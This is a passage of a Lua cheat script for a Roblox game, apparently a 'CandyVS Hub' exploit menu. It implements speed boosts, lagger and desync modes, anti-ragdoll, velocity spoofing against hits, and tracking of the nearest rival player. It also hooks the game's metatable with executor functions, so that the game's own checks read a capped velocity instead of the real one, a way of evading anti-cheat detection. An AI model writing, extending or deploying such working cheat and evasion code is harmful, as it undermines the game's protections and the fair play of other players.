	pcall(function() change(settings().Rendering, "QualityLevel", Enum.QualityLevel.Level01) end)
	pcall(function()
	change(UserSettings():GetService("UserGameSettings"), "SavedQualityLevel", Enum.SavedQualitySetting.QualityLevel1)
	end)
	for _, root in ipairs({ workspace, Lighting }) do
	table.insert(connections, root.DescendantAdded:Connect(function(object)
	task.defer(function()
	if active and generation == token then pcall(apply, object) end
	end)
	end))
	end
	table.insert(connections, Lighting.Changed:Connect(function(property)
	if active and (property == "GlobalShadows" or property == "EnvironmentDiffuseScale"
	or property == "EnvironmentSpecularScale" or property == "FogStart" or property == "FogEnd") then
	applyLighting()
	end
	end))
	if scanCancel then scanCancel() end
	scanCancel = _G.__CandyVSWalkDescendantsBatched({ workspace, Lighting }, apply, function()
	return active and generation == token
	end)
	end
	_G.__CandyVSTrackStopper(stop)
	end)()


	do
	local currentFps, currentPing = 0, 0
	local fpsElapsed, fpsFrames = 0, 0
	local topFpsConn = nil

	local function safeGetPing()
	local ok, ping = pcall(function() return Player:GetNetworkPing() * 1000 end)
	if ok and type(ping) == "number" then return math.floor(ping) end
	return 0
	end

	local function updateTopLabel()
	if FPSLabel then FPSLabel.Text = tostring(currentFps) .. " FPS" end
	if PingLabel then PingLabel.Text = tostring(currentPing) .. " MS" end
	if StatsRightFps then StatsRightFps.Text = tostring(currentFps) .. " FPS" end
	if StatsRightPing then StatsRightPing.Text = tostring(currentPing) .. " MS" end
	end

	if topFpsConn then return end
	fpsElapsed = 0; fpsFrames = 0
	topFpsConn = _G.__CandyVSTrackConn(RunService.RenderStepped:Connect((function(dt)
	fpsFrames = fpsFrames + 1; fpsElapsed = fpsElapsed + dt
	if fpsElapsed >= 1 then
	currentFps = math.floor((fpsFrames / fpsElapsed) + 0.5); fpsFrames = 0; fpsElapsed = 0
	currentPing = safeGetPing()
	updateTopLabel()
	end
	end)))

	end

	do
	local enemyWidget = nil
	local enemyWidgetDragging, enemyWidgetDragStart, enemyWidgetStartPos = false, nil, nil
	local enemyWidgetPos = _G["_CandyVS_UI_EnemyWidgetPos"] or { x = 140, y = -340 }
	_G.__CandyVSGuiPositionResetters.EnemyWidget = function()
	enemyWidgetDragging = false
	enemyWidgetPos = { x = 140, y = -340 }
	_G["_CandyVS_UI_EnemyWidgetPos"] = nil
	if enemyWidget and enemyWidget.Parent then
	enemyWidget.Position = UDim2.fromOffset(enemyWidgetPos.x, enemyWidgetPos.y)
	end
	end
	local enemyRagdollCountdown = 0
	local trackedEnemy = nil
	local trackedEnemyId = nil
	local lastEnemyRagdollState = false
	local cachedTimerLbl = nil
	local cachedEnemyHum = nil
	local lastTimerText = ""
	local lastWidgetVisible = nil
	_G.__CandyVSGetVisualEnemy = function()
	if trackedEnemy and trackedEnemy.Parent == Players then return trackedEnemy end
	return nil
	end

	local function createEnemyWidget()
	if enemyWidget and enemyWidget.Parent then return enemyWidget end

	enemyWidget = Instance.new("Frame", ScreenGui)
	enemyWidget.Name = "CandyVSEnemyWidget"
	enemyWidget.Size = UDim2.new(0, 140, 0, 80)
	enemyWidget.Position = UDim2.new(0, enemyWidgetPos.x, 0, enemyWidgetPos.y)
	_G.__enemyWidget = enemyWidget
	_G.__CandyVSRegisterThemeRoot(enemyWidget)
	enemyWidget.BackgroundTransparency = 0.15
	enemyWidget.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	enemyWidget.ZIndex = 600
	enemyWidget.Visible = false
	Instance.new("UICorner", enemyWidget).CornerRadius = UDim.new(0, 8)
	local stroke = Instance.new("UIStroke", enemyWidget)
	stroke.Color = Color3.fromRGB(0, 0, 0)
	stroke.Thickness = 1

	local titleLbl = Instance.new("TextLabel", enemyWidget)
	titleLbl.Name = "EWTitle"
	titleLbl.Size = UDim2.new(1, -10, 0, 14)
	titleLbl.Position = UDim2.new(0, 8, 0, 4)
	titleLbl.BackgroundTransparency = 1
	titleLbl.Text = "RIVAL"
	titleLbl.Font = Enum.Font.FredokaOne
	titleLbl.TextSize = 10
	titleLbl.TextColor3 = Color3.fromRGB(180, 180, 180)
	titleLbl.TextXAlignment = Enum.TextXAlignment.Left
	titleLbl.ZIndex = 601

	local avatarImg = Instance.new("ImageLabel", enemyWidget)
	avatarImg.Name = "EWAvatar"
	avatarImg.Size = UDim2.new(0, 44, 0, 44)
	avatarImg.Position = UDim2.new(0, 6, 0, 20)
	avatarImg.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	avatarImg.BorderSizePixel = 0
	avatarImg.Image = ""
	avatarImg.ZIndex = 601
	Instance.new("UICorner", avatarImg).CornerRadius = UDim.new(0, 6)
	local avatarStroke = Instance.new("UIStroke", avatarImg)
	avatarStroke.Color = Color3.fromRGB(180, 180, 180)
	avatarStroke.Thickness = 1

	local nameLbl = Instance.new("TextLabel", enemyWidget)
	nameLbl.Name = "EWName"
	nameLbl.Size = UDim2.new(1, -60, 0, 18)
	nameLbl.Position = UDim2.new(0, 56, 0, 22)
	nameLbl.BackgroundTransparency = 1
	nameLbl.Text = "---"
	nameLbl.Font = Enum.Font.FredokaOne
	nameLbl.TextSize = 13
	nameLbl.TextColor3 = Color3.fromRGB(180, 180, 180)
	nameLbl.TextXAlignment = Enum.TextXAlignment.Left
	nameLbl.TextScaled = false
	local timerLbl = Instance.new("TextLabel", enemyWidget)
	timerLbl.Name = "EWTimer"
	timerLbl.Size = UDim2.new(1, -60, 0, 20)
	timerLbl.Position = UDim2.new(0, 56, 0, 44)
	timerLbl.BackgroundTransparency = 1
	timerLbl.Text = ""
	timerLbl.Font = Enum.Font.FredokaOne
	timerLbl.TextSize = 16
	timerLbl.TextColor3 = Color3.fromRGB(255, 221, 0)
	timerLbl.TextXAlignment = Enum.TextXAlignment.Left
	timerLbl.ZIndex = 601

	enemyWidget.InputBegan:Connect(function(inp)
	if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
	enemyWidgetDragging = true
	enemyWidgetDragStart = inp.Position
	enemyWidgetStartPos = enemyWidget.Position
	inp.Changed:Connect(function()
	if inp.UserInputState == Enum.UserInputState.End then
	enemyWidgetDragging = false
	enemyWidgetPos.x = enemyWidget.Position.X.Offset
	enemyWidgetPos.y = enemyWidget.Position.Y.Offset
	_G["_CandyVS_UI_EnemyWidgetPos"] = { x = enemyWidgetPos.x, y = enemyWidgetPos.y }
	saveConfig()
	end
	end)
	end
	end)
	_G.__CandyVSTrackConn(UserInputService.InputChanged:Connect((function(inp)
	if not enemyWidgetDragging then return end
	if inp.UserInputType ~= Enum.UserInputType.MouseMovement and inp.UserInputType ~= Enum.UserInputType.Touch then return end
	local delta = inp.Position - enemyWidgetDragStart
	local vs = workspace.CurrentCamera.ViewportSize
	local nx = math.clamp(enemyWidgetStartPos.X.Offset + delta.X, 0, vs.X - enemyWidget.AbsoluteSize.X)
	local ny = math.clamp(enemyWidgetStartPos.Y.Offset + delta.Y, 0, vs.Y - enemyWidget.AbsoluteSize.Y)
	enemyWidget.Position = UDim2.new(0, nx, 0, ny)
	end)))

	return enemyWidget
	end

	local function loadEnemyThumbnail(userId)
	local w = createEnemyWidget()
	local avatarImg = w:FindFirstChild("EWAvatar")
	if not avatarImg then return end
	avatarImg.Image = ""
	task.spawn(function()
	local ok, img = pcall(function()
	return Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
	end)
	if ok and img and avatarImg and avatarImg.Parent then
	avatarImg.Image = img
	end
	end)
	end

	local function setTrackedEnemy(player)
	if player and trackedEnemy and player.UserId == trackedEnemyId then return end
	if not player and not trackedEnemy then return end
	trackedEnemy = player
	lastEnemyRagdollState = false
	cachedEnemyHum = nil

	local w = createEnemyWidget()
	local nameLbl = w:FindFirstChild("EWName")
	cachedTimerLbl = w:FindFirstChild("EWTimer")

	if player then
	trackedEnemyId = player.UserId
	if nameLbl then nameLbl.Text = player.Name end
	if cachedTimerLbl then cachedTimerLbl.Text = ""; lastTimerText = "" end
	loadEnemyThumbnail(player.UserId)
	w.Visible = true; lastWidgetVisible = true
	else
	trackedEnemyId = nil
	if nameLbl then nameLbl.Text = "---" end
	if cachedTimerLbl then cachedTimerLbl.Text = ""; lastTimerText = "" end
	local avatarImg = w:FindFirstChild("EWAvatar")
	if avatarImg then avatarImg.Image = "" end
	w.Visible = false; lastWidgetVisible = false
	end
	end

	local function updateEnemyTimer(dt)
	if enemyRagdollCountdown > 0 then
	enemyRagdollCountdown = math.max(0, enemyRagdollCountdown - dt)
	end
	local timerLbl = cachedTimerLbl
	if not timerLbl or not timerLbl.Parent then return end
	if enemyRagdollCountdown > 0 then
	local newText = string.format("%.1fs", enemyRagdollCountdown)
	if newText ~= lastTimerText then
	timerLbl.Text = newText
	timerLbl.TextColor3 = Color3.fromRGB(255, 221, 0)
	lastTimerText = newText
	end
	elseif lastTimerText ~= "" then
	timerLbl.Text = ""
	lastTimerText = ""
	end
	end

	local ewLastScan = 0
	local ewTimerAcc = 0
	_G.__CandyVSTrackConn(RunService.Heartbeat:Connect((function(dt)
	ewTimerAcc = ewTimerAcc + (dt or 0)
	if trackedEnemy and ewTimerAcc >= 0.20 then
	updateEnemyTimer(ewTimerAcc)
	ewTimerAcc = 0
	elseif not trackedEnemy and ewTimerAcc >= 0.20 then
	ewTimerAcc = 0
	end

	local now = os.clock()
	if now - ewLastScan < 0.25 then return end
	ewLastScan = now

	local myChar = Player.Character
	local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
	if not myHRP then return end

	local myPos = myHRP.Position
	local closest = nil
	local closestDist = math.huge
	for _, plr in ipairs(Players:GetPlayers()) do
	local character = plr ~= Player and plr.Character
	if character then
	local hrp = character:FindFirstChild("HumanoidRootPart")
	if hrp then
	local position = hrp.Position
	local dx = myPos.X - position.X
	local dy = myPos.Y - position.Y
	local dz = myPos.Z - position.Z
	local d = dx*dx + dy*dy + dz*dz
	if d < closestDist then
	closestDist = d
	closest = plr
	end
	end
	end
	end

	if closest ~= trackedEnemy then
	setTrackedEnemy(closest)
	end

	local w = enemyWidget
	if w and w.Parent then
	local shouldShow = closest ~= nil
	if shouldShow ~= lastWidgetVisible then
	w.Visible = shouldShow
	lastWidgetVisible = shouldShow
	end
	end

	if trackedEnemy then
	local nameLbl = w and w:FindFirstChild("EWName")
	if nameLbl then
	if trackedEnemy:GetAttribute("Stealing") == true then
	nameLbl.TextColor3 = Color3.fromRGB(255, 60, 60)
	else
	nameLbl.TextColor3 = Color3.fromRGB(180, 180, 180)
	end
	end
	end

	if trackedEnemy and trackedEnemy.Character then
	if not cachedEnemyHum or not cachedEnemyHum.Parent then
	cachedEnemyHum = trackedEnemy.Character:FindFirstChildOfClass("Humanoid")
	end
	if cachedEnemyHum then
	local state = cachedEnemyHum:GetState()
	local isRagdolled = (
	state == Enum.HumanoidStateType.Physics or
	state == Enum.HumanoidStateType.Ragdoll or
	state == Enum.HumanoidStateType.FallingDown
	)
	if isRagdolled and not lastEnemyRagdollState then
	enemyRagdollCountdown = 3.0
	elseif isRagdolled and enemyRagdollCountdown < 0.5 then
	enemyRagdollCountdown = 0.5
	end
	lastEnemyRagdollState = isRagdolled
	end
	end
	end)))

	_G["_CandyVSHub_EnemyWidget_SaveHook"] = function()
	if enemyWidget and enemyWidget.Parent then
	enemyWidgetPos.x = enemyWidget.Position.X.Offset
	enemyWidgetPos.y = enemyWidget.Position.Y.Offset
	_G["_CandyVS_UI_EnemyWidgetPos"] = { x = enemyWidgetPos.x, y = enemyWidgetPos.y }
	end
	end

	createEnemyWidget()
	end


	local function makeUraniumSection(parent, title)
	local section = Instance.new("Frame")
	section.Name = (title and tostring(title) or "Section") .. "SectionStub"
	section.BackgroundTransparency = 1
	section.Visible = false
	section.Parent = parent
	return section
	end


	local function makeToggle(parent, text, featureName, buildExtensionContent)
	local container = Instance.new("Frame")
	container.Name = tostring(featureName or text or "Toggle") .. "Stub"
	container.BackgroundTransparency = 1
	container.Visible = false
	container.Parent = parent
	if buildExtensionContent then
	local card = Instance.new("TextButton")
	card.Text = ""
	card.Parent = container
	local extension = Instance.new("Frame")
	extension.BackgroundTransparency = 1
	extension.Parent = container
	buildExtensionContent(extension)
	end
	return container
	end


	local function makeToggleNoKeybind(parent, text, featureName)
	local container = Instance.new("Frame")
	container.Name = tostring(featureName or text or "Toggle") .. "Stub"
	container.BackgroundTransparency = 1
	container.Visible = false
	container.Parent = parent
	return container
	end


	local function selectMode(mode)
	toggleStates["Speed Boost"] = true
	if _G.__refreshSpeedBoost then pcall(_G.__refreshSpeedBoost) end
	if selectedMode == mode then
	if carrySpeedMode == "v2" then
	speedToggled = not speedToggled
	toggleStates["Carry Speed"] = speedToggled
	if toggleVisualUpdaters["Carry Speed"] then toggleVisualUpdaters["Carry Speed"]() end
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	saveConfig()
	end
	return
	end
	if _G.__CandyVSResetSpeedDirection then pcall(_G.__CandyVSResetSpeedDirection) end
	selectedMode = mode
	if mode == "Lagger" then
	laggerEnabled = true
	else
	laggerEnabled = false
	end
	for _, ref in ipairs(_speedCardRefs) do
	if ref.updateVisual then pcall(ref.updateVisual) end
	end
	saveConfig()
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	end

	FeatureToggles = FeatureToggles or {}
	FeatureToggles["SelectNormalMode"] = function() selectMode("Normal") end
	FeatureToggles["SelectLaggerMode"] = function() selectMode("Lagger") end
	FeatureToggles["SelectDesyncMode"] = function() selectMode("Desync") end
	FeatureToggles["Toggle UI"] = function()
	if _G.__setPanelVisible then
	_G.__setPanelVisible(not Panel.Visible)
	else
	panelVisible = not Panel.Visible
	Panel.Visible = panelVisible
	toggleStates["Toggle UI"] = panelVisible
	end
	if toggleVisualUpdaters["Toggle UI"] then toggleVisualUpdaters["Toggle UI"]() end
	saveConfig()
	end
	local function getSelectedBoostSpeed()
	if selectedMode == "Lagger" or laggerEnabled then
	return speedValues.LaggerBoost or laggerSpeed
	elseif selectedMode == "Desync" then
	return speedValues.DesyncBoost or normalSpeed
	end
	for _, cs in ipairs(customSpeeds) do
	if selectedMode == cs.name then return cs.boost end
	end
	return speedValues.NormalBoost or normalSpeed
	end

	local AntiRagdollV2 = {
	Enabled = false,
	Connection = nil,
	ResetCooldown = 0,
	}

	local function startAntiRagdoll()
	if AntiRagdollV2.Connection then return end
	AntiRagdollV2.Enabled = true
	AntiRagdollV2.Connection = RunService.Heartbeat:Connect((function()
	if not toggleStates["Anti Ragdoll"] then return end
	local char = Player.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	local root = char:FindFirstChild("HumanoidRootPart")
	if not hum or not root or hum.Health <= 0 then return end

	if _G.dropActive then return end
	local state = hum:GetState()
	local now = tick()
	if state == Enum.HumanoidStateType.Physics or
	state == Enum.HumanoidStateType.Ragdoll or
	state == Enum.HumanoidStateType.FallingDown then
	if now - AntiRagdollV2.ResetCooldown > 0.15 then
	AntiRagdollV2.ResetCooldown = now
	pcall(function()
	hum:ChangeState(Enum.HumanoidStateType.GettingUp)
	root.Velocity = Vector3.zero
	root.RotVelocity = Vector3.zero
	root.AssemblyLinearVelocity = Vector3.zero
	root.AssemblyAngularVelocity = Vector3.zero
	for _, obj in ipairs(char:GetDescendants()) do
	if obj:IsA("Motor6D") then obj.Enabled = true end
	if obj:IsA("Constraint") then obj.Enabled = true end
	end
	workspace.CurrentCamera.CameraSubject = hum
	local PM = Player.PlayerScripts:FindFirstChild("PlayerModule")
	if PM then
	local CM = require(PM:FindFirstChild("ControlModule"))
	if CM then CM:Enable() end
	end
	hum.AutoRotate = true
	hum.PlatformStand = false
	hum.Sit = false
	end)
	end
	end
	end))
	end

local function stopAntiRagdoll()
	AntiRagdollV2.Enabled = false
	if AntiRagdollV2.Connection then
	AntiRagdollV2.Connection:Disconnect()
	AntiRagdollV2.Connection = nil
	end
end
_G.__CandyVSTrackStopper(stopAntiRagdoll)
FeaturePostToggle["Anti Ragdoll"] = function(active)
if active then startAntiRagdoll() else stopAntiRagdoll() end
end

	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function(newChar)
	task.wait(0.5)
	if toggleStates["Anti Ragdoll"] then
	if AntiRagdollV2.Connection then 
	AntiRagdollV2.Connection:Disconnect() 
	AntiRagdollV2.Connection = nil 
	end
	startAntiRagdoll()
	end
	end))

if toggleStates["Anti Ragdoll"] then startAntiRagdoll() end

	do
	local AntiBat = {
	Connection = nil,
	RagdollConnection = nil,
	}

	local function stopAntiBat()
	if AntiBat.Connection then
	AntiBat.Connection:Disconnect()
	AntiBat.Connection = nil
	end
	if AntiBat.RagdollConnection then
	AntiBat.RagdollConnection:Disconnect()
	AntiBat.RagdollConnection = nil
	end
	end

	local function startAntiBatVelocity()
	local char = Player.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not root then return end
	if AntiBat.Connection then AntiBat.Connection:Disconnect() end
	AntiBat.Connection = RunService.Heartbeat:Connect((function()
	if not toggleStates["Anti Bat"] or not root.Parent then return end
	local originalXZ = Vector3.new(root.Velocity.X, 0, root.Velocity.Z)
	root.Velocity = Vector3.new(1000, root.Velocity.Y, 1000)
	RunService.RenderStepped:Wait()
	if root.Parent then
	root.Velocity = Vector3.new(originalXZ.X, root.Velocity.Y, originalXZ.Z)
	end
	end))
	end

	local function startAntiBatRagdoll()
	if AntiBat.RagdollConnection then return end
	AntiBat.RagdollConnection = RunService.Heartbeat:Connect((function()
	if not toggleStates["Anti Bat"] then return end
	local char = Player.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	local root = char:FindFirstChild("HumanoidRootPart")
	if hum then
	local state = hum:GetState()
	if state == Enum.HumanoidStateType.Physics
	or state == Enum.HumanoidStateType.Ragdoll
	or state == Enum.HumanoidStateType.FallingDown then
	hum:ChangeState(Enum.HumanoidStateType.Running)
	workspace.CurrentCamera.CameraSubject = hum
	pcall(function()
	local playerModule = Player.PlayerScripts:FindFirstChild("PlayerModule")
	if playerModule then
	require(playerModule:FindFirstChild("ControlModule")):Enable()
	end
	end)
	if root then
	root.Velocity = Vector3.new(0, 0, 0)
	root.RotVelocity = Vector3.new(0, 0, 0)
	end
	end
	end
	for _, object in ipairs(char:GetDescendants()) do
	if object:IsA("Motor6D") and not object.Enabled then
	object.Enabled = true
	end
	end
	end))
	end

	local function startAntiBat()
	stopAntiBat()
	startAntiBatVelocity()
	startAntiBatRagdoll()
	end

	_G.__CandyVSTrackStopper(stopAntiBat)
	FeaturePostToggle["Anti Bat"] = function(active)
	if active then startAntiBat() else stopAntiBat() end
	end
	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function()
	task.wait(0.3)
	if toggleStates["Anti Bat"] then startAntiBat() end
	end))
	if toggleStates["Anti Bat"] then startAntiBat() end
	end

	local function getSelectedStealSpeed()
	if selectedMode == "Lagger" or laggerEnabled then
	return speedValues.LaggerSteal or carrySpeed
	elseif selectedMode == "Desync" then
	return speedValues.DesyncSteal or carrySpeed
	end
	for _, cs in ipairs(customSpeeds) do
	if selectedMode == cs.name then return cs.steal end
	end
	return speedValues.NormalSteal or carrySpeed
	end

	local function shouldUseStealSpeed(isStealing)
	return speedToggled or (isStealing and toggleStates["Auto Carry Speed"])
	end

	do
	local oldSpeedState = _G.__CandyVSSpeedSpoofState
	if type(oldSpeedState) == "table" then oldSpeedState.enabled = false end
	local s2State = _G.__CandyVSS2SpeedState
	if type(s2State) ~= "table" then
		s2State = { hooked = false }
		_G.__CandyVSS2SpeedState = s2State
	end
	s2State.enabled = false
	s2State.root = nil
	s2State.velChecked = setmetatable({}, { __mode = "k" })

	local function setupVelChecked(character)
		s2State.velChecked = setmetatable({}, { __mode = "k" })
		if not character then s2State.root = nil; return nil end
		local root = character:WaitForChild("HumanoidRootPart", 5)
		if root then
			s2State.root = root
			s2State.velChecked[root] = true
		end
		return root
	end

	local function hookVelHRP(root)
		if not root then return end
		s2State.root = root
		s2State.velChecked[root] = true
		if s2State.hooked then return end
		if type(getrawmetatable) ~= "function" or type(setreadonly) ~= "function"
			or type(newcclosure) ~= "function" or type(checkcaller) ~= "function" then return end
		pcall(function()
			local mt = getrawmetatable(game)
			if not mt then return end
			local originalIndex = rawget(mt, "__index")
			if type(originalIndex) ~= "function" and type(originalIndex) ~= "table" then return end
			local replacementIndex = newcclosure(function(self, key)
				local value
				if type(originalIndex) == "function" then value = originalIndex(self, key)
				else value = originalIndex[key] end
				if not checkcaller() and s2State.velChecked[self]
					and (key == "AssemblyLinearVelocity" or key == "Velocity")
					and typeof(value) == "Vector3" and value.Magnitude > 20 then
					return value.Unit * 20
				end
				return value
			end)
			setreadonly(mt, false)
			mt.__index = replacementIndex
			s2State.hooked = true
			setreadonly(mt, true)
		end)
	end

	local function resetSpeedMovement()
		lastMoveDir = Vector3.zero
		s2State.enabled = false
	end
	_G.__CandyVSResetSpeedDirection = function()
		lastMoveDir = Vector3.zero
		local character = Player.Character
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
		local root = character and character:FindFirstChild("HumanoidRootPart")
		if humanoid and root and humanoid.MoveDirection.Magnitude <= 0.05 then
			root.AssemblyLinearVelocity = Vector3.new(0, root.AssemblyLinearVelocity.Y, 0)
		end
	end
	local isRagdollState = (function(hum)
		if not hum then return true end
		local st = hum:GetState()
		return hum.PlatformStand or st == Enum.HumanoidStateType.Physics
			or st == Enum.HumanoidStateType.Ragdoll or st == Enum.HumanoidStateType.FallingDown
	end)
	local getTargetSpeed = (function(isStealing)
		if shouldUseStealSpeed(isStealing) then return getSelectedStealSpeed() end
		return getSelectedBoostSpeed()
	end)
	local function stopSpeedBoost()
		if _G.__speedBoostConn then _G.__speedBoostConn:Disconnect(); _G.__speedBoostConn = nil end
		resetSpeedMovement()
	end
	local function applyVelocitySpeed(direction, speed)
		local character = Player.Character
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
		local root = character and character:FindFirstChild("HumanoidRootPart")
		if not humanoid or not root or humanoid.Health <= 0 then return end
		if type(speed) ~= "number" or speed ~= speed or speed <= 0 or speed == math.huge then return end

		local verticalVelocity = root.AssemblyLinearVelocity.Y
		if _G._ZurichHub_MovementBlocked == true or _G._CandyVSHub_MovementBlocked == true then
			root.AssemblyLinearVelocity = Vector3.new(0, math.min(verticalVelocity, 0), 0)
			return
		end
		if direction and direction.Magnitude > 0.05 then
			pcall(function()
				if root.SetNetworkOwner then root:SetNetworkOwner(Player) end
			end)
			local unit = direction.Unit
			root.AssemblyLinearVelocity = Vector3.new(unit.X * speed, verticalVelocity, unit.Z * speed)
		else
			root.AssemblyLinearVelocity = Vector3.new(0, verticalVelocity, 0)
		end
	end
	local function startSpeedBoost()
		stopSpeedBoost()
		_G.__speedBoostConn = RunService.RenderStepped:Connect(function()
			if not toggleStates["Speed Boost"] then return end
			local character = Player.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			local root = character and character:FindFirstChild("HumanoidRootPart")
			if not humanoid or not root or humanoid.Health <= 0 then return end
			if toggleStates["Autoplay"] or toggleStates["TP Bat"]
				or toggleStates["Aimbot"] or toggleStates["Lagger Aimbot"]
				or _G.dropActive or _G.IsDropping then
				resetSpeedMovement()
				return
			end
			if isRagdollState(humanoid) then
				lastMoveDir = Vector3.zero
				return
			end
			if s2State.root ~= root or not s2State.velChecked[root] then
				lastMoveDir = Vector3.zero
				setupVelChecked(character)
				hookVelHRP(root)
			end
			s2State.enabled = true
			local direction
			if humanoid.MoveDirection.Magnitude > 0 then
				lastMoveDir = humanoid.MoveDirection
				direction = humanoid.MoveDirection
			elseif lastMoveDir.Magnitude > 0 then
				for key in pairs(MOVE_KEYS) do
					if UserInputService:IsKeyDown(key) then
						direction = lastMoveDir
						break
					end
				end
			end
			local selectedSpeed = getTargetSpeed(Player:GetAttribute("Stealing") == true)
			applyVelocitySpeed(direction, tonumber(selectedSpeed) or 16)
		end)
	end
	local function applySpeedBoostNow()
		if not toggleStates["Speed Boost"] then return end
		local character = Player.Character
		local hum = character and character:FindFirstChildOfClass("Humanoid")
		if not hum or hum.Health <= 0 or isRagdollState(hum) then return end
		local direction = hum.MoveDirection.Magnitude > 0.05 and hum.MoveDirection or nil
		applyVelocitySpeed(direction, getTargetSpeed(Player:GetAttribute("Stealing") == true))
	end
	local function refreshSpeedBoost()
		if toggleStates["Speed Boost"] then startSpeedBoost() else stopSpeedBoost() end
	end
	_G.__refreshSpeedBoost = refreshSpeedBoost
	_G.__stopSpeedBoost = stopSpeedBoost
	_G.__CandyVSTrackStopper(function()
		toggleStates["Speed Boost"] = false
		stopSpeedBoost()
		s2State.root = nil
		_G.__CandyVSResetSpeedDirection = nil
	end)
	if Player.Character then
		local initialRoot = setupVelChecked(Player.Character)
		hookVelHRP(initialRoot)
	end
	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function(character)
		task.wait(0.5)
		resetSpeedMovement()
		local root = character:WaitForChild("HumanoidRootPart", 5)
		if root then setupVelChecked(character); hookVelHRP(root) end
		if toggleStates["Speed Boost"] then startSpeedBoost() end
	end))
	_G.__CandyVSTrackConn(Player.CharacterRemoving:Connect(function()
		stopSpeedBoost()
		s2State.root = nil
		s2State.velChecked = setmetatable({}, { __mode = "k" })
	end))
	FeatureToggles["Speed Boost"] = function()
	if carrySpeedMode == "v2" then
	speedToggled = not speedToggled
	toggleStates["Carry Speed"] = speedToggled
	toggleStates["Speed Boost"] = true
	startSpeedBoost()
	if toggleVisualUpdaters["Carry Speed"] then toggleVisualUpdaters["Carry Speed"]() end
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	saveConfig()
	return
	end
	toggleStates["Speed Boost"] = not toggleStates["Speed Boost"]
	if toggleVisualUpdaters["Speed Boost"] then toggleVisualUpdaters["Speed Boost"]() end
	refreshSpeedBoost(); saveConfig()
	end
	FeaturePostToggle["Speed Boost"] = function(active) if active then startSpeedBoost() else stopSpeedBoost() end end

	FeatureToggles["Carry Speed"] = function()
	toggleStates["Carry Speed"] = not toggleStates["Carry Speed"]
	speedToggled = toggleStates["Carry Speed"]
	toggleStates["Speed Boost"] = true
	startSpeedBoost()
	applySpeedBoostNow()
	if toggleVisualUpdaters["Carry Speed"] then toggleVisualUpdaters["Carry Speed"]() end
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	saveConfig()
	end
	FeaturePostToggle["Carry Speed"] = function(active)
	speedToggled = active
	if active or carrySpeedMode == "v2" then
	toggleStates["Speed Boost"] = true
	startSpeedBoost()
	applySpeedBoostNow()
	end
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	end

	local autoCarryStartedBoost = false
	FeaturePostToggle["Auto Carry Speed"] = function(active)
	if active and not toggleStates["Speed Boost"] then
	toggleStates["Speed Boost"] = true
	autoCarryStartedBoost = true
	startSpeedBoost()
	elseif not active and autoCarryStartedBoost then
	toggleStates["Speed Boost"] = false
	autoCarryStartedBoost = false
	stopSpeedBoost()
	end
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	end

	local sbSetupPending = {}
	local speedLabelCache = setmetatable({}, {__mode = "k"})
	local LOCAL_SPEED_GRADIENT_GUI1 = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 140, 0)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 230, 245)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 150, 200)),
	})
	local LOCAL_SPEED_GRADIENT_GUI2 = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 140, 40)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 220, 160)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 170, 70)),
	})

	local function getSpeedThemeGradient(isLocal)
	if _G.__CandyVSGuiTheme == "GUI 3" then
	return ColorSequence.new(Color3.fromRGB(255, 45, 45), Color3.fromRGB(190, 15, 25))
	end
	if isLocal then
	return _G.__CandyVSGuiTheme == "GUI 2" and LOCAL_SPEED_GRADIENT_GUI2 or LOCAL_SPEED_GRADIENT_GUI1
	end
	return ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(230, 230, 230)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 200, 200)),
	})
	end
	local setupSpeedBillboard

	local function getPlayerSpeedDisplayText(p)
	local char = p.Character
	if not char then return "0" end
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hrp then return "0" end
	local velocity = hrp.AssemblyLinearVelocity
	local realSpeed = Vector3.new(velocity.X, 0, velocity.Z).Magnitude
	local displaySpeed = realSpeed < 0.5 and 0 or math.floor(realSpeed + 0.5)
	if p == Player then
	local isStealing = Player:GetAttribute("Stealing") == true
	local isCarrySpeed = speedToggled or (isStealing and toggleStates["Auto Carry Speed"])
	local humanoid = char:FindFirstChildOfClass("Humanoid")
	if toggleStates["Speed Boost"] and humanoid and humanoid.MoveDirection.Magnitude > 0.05 then
	displaySpeed = math.floor(getTargetSpeed(isStealing) + 0.5)
	end
	return tostring(displaySpeed) .. " - " .. (isCarrySpeed and "CARRY" or "NORMAL")
	end
	return tostring(displaySpeed)
	end

	local function requestSpeedBillboard(char, isLocal)
	if not char or not char.Parent then return end
	if sbSetupPending[char] then return end
	sbSetupPending[char] = true
	task.spawn(function()
	setupSpeedBillboard(char, isLocal)
	sbSetupPending[char] = nil
	end)
	end

	setupSpeedBillboard = function(char, isLocal)
	task.wait(0.3)
	local head = char:FindFirstChild("Head")
	if not head then return end
